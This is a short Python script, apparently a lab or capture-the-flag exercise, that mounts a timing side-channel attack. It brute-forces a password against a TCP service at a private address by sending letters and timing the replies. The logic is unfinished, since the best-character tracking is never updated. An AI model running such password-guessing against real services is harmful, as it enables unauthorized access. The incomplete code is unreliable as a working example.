# Create a python script for side-channel (timing) attack, brute force the password
# Code for sending message to port: https://pymotw.com/2/socket/tcp.html

# Start with 1 letter, then 2 letter, then ...
# Keep the character with the highest processing time (use time module)
# print out the processing time to compare

import time
import socket
import sys

best_char = ''
max_response_time = 0

# Brute force the password with characters from A to Z
for char in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect the socket to the port where the server is listening
    # IP = 10.241.13.12, Port = 1234
    server_address = ('10.241.13.12', 1234)
    print(sys.stderr, 'connecting to %s port %s' % server_address)
    sock.connect(server_address)
    
    # Construct the message with the current character
    # message = ('T' + char).encode('utf-8') # Encode the combination to bytes
    message = (char).encode('utf-8')  # Encode the character to bytes
    
    print(sys.stderr, 'sending "%s"' % message)
   
    data = sock.recv(90)
    # Measure the start time
    start_time = time.time()
    # Send the message
    sock.sendall(message)

    # Look for the response
    data = sock.recv(90)
    print(sys.stderr, 'received "%s"' % data)

    # Measure the end time and calculate response time
    end_time = time.time()
    response_time = "{:.6f}".format(end_time - start_time) 


    print("response time:", response_time)
    print(sys.stderr, 'closing socket')
    sock.close()
    
 
